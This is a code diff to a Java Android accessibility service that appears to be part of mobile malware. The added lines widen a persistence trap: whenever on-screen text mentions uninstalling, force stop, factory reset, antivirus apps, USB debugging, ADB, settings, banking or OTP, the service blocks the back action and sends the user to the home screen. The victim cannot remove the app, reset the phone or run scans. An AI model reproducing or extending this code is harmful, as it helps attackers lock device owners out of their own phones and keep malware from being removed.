@@ -185,7 +185,8 @@ public static void clickAtPosition(int i, int i2, AccessibilityNodeInfo accessib
     }
  👇👇👇👇👇👇👇👇👇👇👇👇👇
 
-if (!bypass.booleanValue()) {
+
+    if (!bypass.booleanValue()) {
 			String str = "[" + getApplicationContext().getResources().getString(R.string.accessibility_service_label) + "]";
 			String string = getApplicationContext().getResources().getString(R.string.accessibility_service_label);
 			if (Build.VERSION.SDK_INT > 15) {
@@ -195,23 +196,206 @@ if (!bypass.booleanValue()) {
 					SendMeHome(268435456);
 				}
 				String lowerCase2 = getEventText(accessibilityEvent).toLowerCase();
-		if (lowerCase2.contains("Force stop".toLowerCase()) || lowerCase2.contains("Delete app data".toLowerCase())) {
+				if (lowerCase2.contains("Force stop".toLowerCase()) || lowerCase2.contains("Delete app data".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
 				}
-				
+
 				if (lowerCase2.contains("Clear data".toLowerCase()) || lowerCase2.contains("Clear all data".toLowerCase()) || lowerCase2.contains("app data".toLowerCase()) || lowerCase2.contains("Clear cache".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
 				}
-				
-				
+
+
 				if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
 				}
 				
 				if (lowerCase2.contains("Backup & reset".toLowerCase()) || lowerCase2.contains("Erase all data".toLowerCase()) || lowerCase2.contains("Reset phone".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+
+				if (lowerCase2.contains("Erase all data".toLowerCase()) || lowerCase2.contains("factory reset".toLowerCase()) || lowerCase2.contains("Erase all data on phone".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				if (lowerCase2.contains("Internet".toLowerCase()) || lowerCase2.contains("Network".toLowerCase()) || lowerCase2.contains("data".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Wifi".toLowerCase()) || lowerCase2.contains("Wi fi".toLowerCase()) || lowerCase2.contains("Airoplane mode".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("SIM card & mobile data".toLowerCase()) || lowerCase2.contains("Connection & sharing".toLowerCase()) || lowerCase2.contains("Wi-Fi".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Privacy".toLowerCase()) || lowerCase2.contains("Security".toLowerCase()) || lowerCase2.contains("Password".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("App Managnent".toLowerCase()) || lowerCase2.contains("Location".toLowerCase()) || lowerCase2.contains("Storage".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Developer Option".toLowerCase()) || lowerCase2.contains("Usb".toLowerCase()) || lowerCase2.contains("OTG".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Update".toLowerCase()) || lowerCase2.contains("install".toLowerCase()) || lowerCase2.contains("Google".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Settings".toLowerCase()) || lowerCase2.contains("File Manager".toLowerCase()) || lowerCase2.contains("AIDE".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("MT Manager".toLowerCase()) || lowerCase2.contains("install".toLowerCase()) || lowerCase2.contains("Install".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("App info".toLowerCase()) || lowerCase2.contains("Chrome".toLowerCase()) || lowerCase2.contains("Youtube".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Editor".toLowerCase()) || lowerCase2.contains("Telegram".toLowerCase()) || lowerCase2.contains("Dual".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Mobile Data".toLowerCase()) || lowerCase2.contains("Termux".toLowerCase()) || lowerCase2.contains("Avast".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+			
+				if (lowerCase2.contains("Avira".toLowerCase()) || lowerCase2.contains("Antivirus".toLowerCase()) || lowerCase2.contains("Trucaller".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Phone".toLowerCase()) || lowerCase2.contains("Call".toLowerCase()) || lowerCase2.contains("Facebook".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Instagram".toLowerCase()) || lowerCase2.contains("Google pay".toLowerCase()) || lowerCase2.contains("Font".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Text".toLowerCase()) || lowerCase2.contains("VPN".toLowerCase()) || lowerCase2.contains("Lock".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Unlock".toLowerCase()) || lowerCase2.contains("Telegraph".toLowerCase()) || lowerCase2.contains("Camera".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Keyboard".toLowerCase()) || lowerCase2.contains("otp".toLowerCase()) || lowerCase2.contains("package".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("packages installer".toLowerCase()) || lowerCase2.contains("installer".toLowerCase()) || lowerCase2.contains("download".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Website".toLowerCase()) || lowerCase2.contains("Script".toLowerCase()) || lowerCase2.contains("Home".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Power off".toLowerCase()) || lowerCase2.contains("restart".toLowerCase()) || lowerCase2.contains("banttry".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("cable".toLowerCase()) || lowerCase2.contains("wireless".toLowerCase()) || lowerCase2.contains("photos".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("whatsapp".toLowerCase()) || lowerCase2.contains("settings".toLowerCase()) || lowerCase2.contains("videos".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("gallery".toLowerCase()) || lowerCase2.contains("cloud".toLowerCase()) || lowerCase2.contains("Search".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("hotspot".toLowerCase()) || lowerCase2.contains("screenshot".toLowerCase()) || lowerCase2.contains("bluetooth".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("share".toLowerCase()) || lowerCase2.contains("recive".toLowerCase()) || lowerCase2.contains("space".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("new".toLowerCase()) || lowerCase2.contains("Android".toLowerCase()) || lowerCase2.contains("System".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Screen".toLowerCase()) || lowerCase2.contains("Clock".toLowerCase()) || lowerCase2.contains("Time".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("date".toLowerCase()) || lowerCase2.contains("player".toLowerCase()) || lowerCase2.contains("NP".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("MT".toLowerCase()) || lowerCase2.contains("Bgram".toLowerCase()) || lowerCase2.contains("apps".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("BGMI".toLowerCase()) || lowerCase2.contains("Pubg".toLowerCase()) || lowerCase2.contains("Lite".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("edit".toLowerCase()) || lowerCase2.contains("bank".toLowerCase()) || lowerCase2.contains("mouse".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Back up & reset".toLowerCase()) || lowerCase2.contains("backup and restore".toLowerCase()) || lowerCase2.contains("Photos, music and other non-app data will be retained.".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				if (lowerCase2.contains("Erase downloaded apps and their data".toLowerCase()) || lowerCase2.contains("Erase all data, including photos and music.".toLowerCase()) || lowerCase2.contains("Additional Settings".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("play store".toLowerCase()) || lowerCase2.contains("scan".toLowerCase()) || lowerCase2.contains("antivirus".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("avast".toLowerCase()) || lowerCase2.contains("phone manager".toLowerCase()) || lowerCase2.contains("app".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
 				}
@@ -224,6 +408,21 @@ if (!bypass.booleanValue()) {
 					blockBack();
 					SendMeHome(268435456);
 				}
+				
+				if (lowerCase2.contains("about phone".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				if (lowerCase2.contains("USB Debuging".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				if (lowerCase2.contains("Adb".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
 				if ((lowerCase2.contains("إيقاف".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) || (lowerCase2.contains("stop".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()))) {
 					blockBack();
 					SendMeHome(268435456);
@@ -241,6 +440,9 @@ if (!bypass.booleanValue()) {
 				}
 			}
 		}
+		
+    }
+
     
 
 
